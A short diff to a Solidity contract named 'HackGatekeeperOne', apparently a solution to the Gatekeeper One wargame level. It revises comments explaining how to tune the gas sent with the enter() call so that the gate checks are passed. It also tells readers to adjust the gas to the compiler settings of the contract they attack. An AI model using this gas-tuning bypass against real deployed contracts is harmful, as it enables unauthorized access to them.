@@ -20,10 +20,12 @@ contract HackGatekeeperOne {
     }
 
 	function attack() public {
-		// Gas amount calculation = 268 gas is the amount of gas used by the first modifier
-		// Gas amount calculation = The gas left by the second modifier is any number that divides equally into 8191
-		// Gas amount calculation = (8191 * 3) + 268 = 24841
-		// 256 gas is used when using v0.8.12+commit.f00d7308 1000 opts ;base = 24573
+		// Gas amount calculation = (8191 * 3) + modifier1GasAmount
+		// 256 gas is used in first modifier when using v0.8.12+commit.f00d7308 1000 opts
+
+		// Important: If you want to run this attack on your own, you will need to change the gas amount to match the compiler settings of the 
+		//    deployed contract you are trying to attack.
+		// For compiler version v0.8.12+commit.f00d7308 with 1000 optimization runs, the gas amount is 24829
 		_gatekeeperOne.enter{gas: 24829}(_calculateKey());
 	}
 }
